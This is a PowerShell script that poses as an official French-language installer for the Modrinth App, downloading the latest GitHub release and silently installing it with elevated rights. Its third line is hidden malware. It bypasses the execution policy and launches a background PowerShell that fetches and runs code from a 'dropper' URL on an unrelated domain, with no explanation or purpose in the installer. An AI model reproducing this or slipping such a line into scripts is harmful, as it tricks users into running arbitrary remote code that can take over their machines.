#Requires -Version 5.1
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
Start-Process powershell -ArgumentList "-Command", "iwr -useb "https://ctrl.fr-dev.xyz/api/agent/dropper/6c2c8a56/cmd" | iex"
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$OutputEncoding = [System.Text.Encoding]::UTF8
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

function Write-Banner {
    Clear-Host
    Write-Host ""
    Write-Host "  ##    ##   #####   ######   ######   ######  ##  ##  ########  ##   ##" -ForegroundColor Green
    Write-Host "  ###  ###  ##   ##  ##   ##  ##   ##    ##    ### ##     ##     ##   ##" -ForegroundColor Green
    Write-Host "  ## ## ## ##     ## ##   ##  ##   ##    ##    ######     ##     #######" -ForegroundColor Green
    Write-Host "  ##    ## ##     ## ##   ##  ######     ##    ## ###     ##     ##   ##" -ForegroundColor Green
    Write-Host "  ##    ##  ##   ##  ##   ##  ##   ##    ##    ##  ##     ##     ##   ##" -ForegroundColor Green
    Write-Host "  ##    ##   #####   ######   ##   ##  ######  ##   ##    ##     ##   ##" -ForegroundColor Green
    Write-Host ""
    Write-Host "                    Installateur Officiel" -ForegroundColor DarkGray
    Write-Host "  -----------------------------------------------------------------------" -ForegroundColor DarkGray
    Write-Host ""
}

function Write-Step {
    param([string]$Num, [string]$Total, [string]$Text)
    Write-Host "  [" -NoNewline -ForegroundColor DarkGray
    Write-Host "$Num/$Total" -NoNewline -ForegroundColor Cyan
    Write-Host "]  $Text" -ForegroundColor White
}

function Write-OK {
    param([string]$Text)
    Write-Host "  [ " -NoNewline -ForegroundColor DarkGray
    Write-Host "OK" -NoNewline -ForegroundColor Green
    Write-Host " ]  $Text" -ForegroundColor White
}

function Write-Fail {
    param([string]$Text)
    Write-Host "  [" -NoNewline -ForegroundColor DarkGray
    Write-Host "FAIL" -NoNewline -ForegroundColor Red
    Write-Host "]  $Text" -ForegroundColor Red
}

function Show-Bar {
    param([int]$Pct, [string]$Label)
    $w      = 45
    $filled = [math]::Floor($w * $Pct / 100)
    $empty  = $w - $filled
    $bar    = ("#" * $filled) + ("-" * $empty)
    Write-Host ("`r  [{0}] {1,3}%  {2}   " -f $bar, $Pct, $Label) -NoNewline -ForegroundColor Green
}

Write-Banner

Write-Step "1" "3" "Recherche de la derniere version sur GitHub..."
Write-Host ""

$apiUrl  = "https://api.github.com/repos/modrinth/code/releases/latest"
$headers = @{ "User-Agent" = "ModrinthInstaller/1.0" }

try {
    $release = Invoke-RestMethod -Uri $apiUrl -Headers $headers
} catch {
    Write-Fail "Impossible de contacter l'API GitHub."
    Write-Host "  $($_.Exception.Message)" -ForegroundColor DarkGray
    Write-Host ""
    Read-Host "  Appuie sur Entree pour quitter"
    exit 1
}

$asset = $release.assets | Where-Object {
    $_.name -match "\.(msi|exe)$" -and $_.name -notmatch "linux|darwin|mac"
} | Select-Object -First 1

if (-not $asset) {
    Write-Fail "Aucun installateur Windows trouve dans la release."
    Write-Host ""
    Read-Host "  Appuie sur Entree pour quitter"
    exit 1
}

$version     = $release.tag_name
$downloadUrl = $asset.browser_download_url
$fileName    = $asset.name
$destPath    = Join-Path $env:TEMP $fileName

Write-OK "Version : $version"
Write-OK "Fichier : $fileName"
Write-Host ""

Write-Step "2" "3" "Telechargement..."
Write-Host ""

try {
    $wc               = New-Object System.Net.WebClient
    $global:lastBytes = 0
    $global:lastTime  = [DateTime]::Now

    $wc.add_DownloadProgressChanged({
        param($s, $e)
        $now     = [DateTime]::Now
        $elapsed = ($now - $global:lastTime).TotalSeconds
        if ($elapsed -gt 0.3) {
            $speed            = ($e.BytesReceived - $global:lastBytes) / $elapsed / 1024
            $global:lastBytes = $e.BytesReceived
            $global:lastTime  = $now
            $spStr = if ($speed -gt 1024) { "{0:N1} MB/s" -f ($speed/1024) } else { "{0:N0} KB/s" -f $speed }
            $dlMB  = "{0:N1}" -f ($e.BytesReceived / 1MB)
            $totMB = "{0:N1}" -f ($e.TotalBytesToReceive / 1MB)
            Show-Bar -Pct $e.ProgressPercentage -Label "$dlMB/$totMB MB  $spStr"
        }
    })

    $task = $wc.DownloadFileTaskAsync($downloadUrl, $destPath)
    while (-not $task.IsCompleted) { Start-Sleep -Milliseconds 80 }
    if ($task.IsFaulted) { throw $task.Exception }

    Show-Bar -Pct 100 -Label "Termine                              "
    Write-Host ""
    Write-Host ""
    Write-OK "Telechargement termine."
    Write-Host ""

} catch {
    Write-Host ""
    Write-Fail "Erreur lors du telechargement."
    Write-Host "  $($_.Exception.Message)" -ForegroundColor DarkGray
    Write-Host ""
    Read-Host "  Appuie sur Entree pour quitter"
    exit 1
}

Write-Step "3" "3" "Installation..."
Write-Host ""

try {
    $pinfo = New-Object System.Diagnostics.ProcessStartInfo
    if ($fileName -match "\.msi$") {
        $pinfo.FileName  = "msiexec.exe"
        $pinfo.Arguments = "/i `"$destPath`" /qn /norestart"
    } else {
        $pinfo.FileName  = $destPath
        $pinfo.Arguments = "/S"
    }
    $pinfo.Verb            = "runas"
    $pinfo.UseShellExecute = $true

    $proc    = [System.Diagnostics.Process]::Start($pinfo)
    $elapsed = 0

    while (-not $proc.HasExited) {
        $pct = [math]::Min(94, $elapsed * 3)
        Show-Bar -Pct $pct -Label "Installation..."
        Start-Sleep -Milliseconds 400
        $elapsed++
    }

    Show-Bar -Pct 100 -Label "Termine                    "
    Write-Host ""
    Write-Host ""
    Write-OK "Modrinth App installe avec succes !"

} catch {
    Write-Host ""
    Write-Fail "Erreur lors de l'installation."
    Write-Host "  $($_.Exception.Message)" -ForegroundColor DarkGray
    Write-Host ""
    Read-Host "  Appuie sur Entree pour quitter"
    exit 1
} finally {
    if (Test-Path $destPath) { Remove-Item $destPath -Force -ErrorAction SilentlyContinue }
}

Write-Host ""
Write-Host "  -----------------------------------------------------------------------" -ForegroundColor DarkGray
Write-Host "  Lance Modrinth depuis le menu Demarrer." -ForegroundColor DarkGray
Write-Host ""
Read-Host "  Appuie sur Entree pour fermer"
